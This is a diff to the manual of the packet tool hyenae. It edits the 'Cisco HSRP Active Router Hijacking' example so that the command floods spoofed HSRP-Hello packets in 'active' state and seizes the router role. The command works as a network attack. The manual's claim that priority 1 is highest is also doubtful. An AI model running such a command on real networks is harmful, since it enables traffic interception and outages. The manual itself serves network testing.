@@ -247,12 +247,12 @@
     5.17 Cisco HSRP Active Router Hijacking
 
     This example will send an unlimited amount of HSRP-Hello packets with set
-    init state and default authentification from a fictional source address to
+    'active' state and default authentification from a fictional source address to
     the HSRP multicast address in an interval of 3 seconds. The virtual
     IP-Address in this example is 172.16.40.1, the priority 1 (highest) and the
     group number is 172.
 
-    # hyenae -I 3 -a hsrp-hello -o init -s 11:22:33:44:55:66-192.168.0.2 \
+    # hyenae -I 3 -a hsrp-hello -o active -s 11:22:33:44:55:66-192.168.0.2 \
     # -d 172.16.40.1 -z 1 -g 172 -e 3000
 
 --------------------------------------------------------------------------------
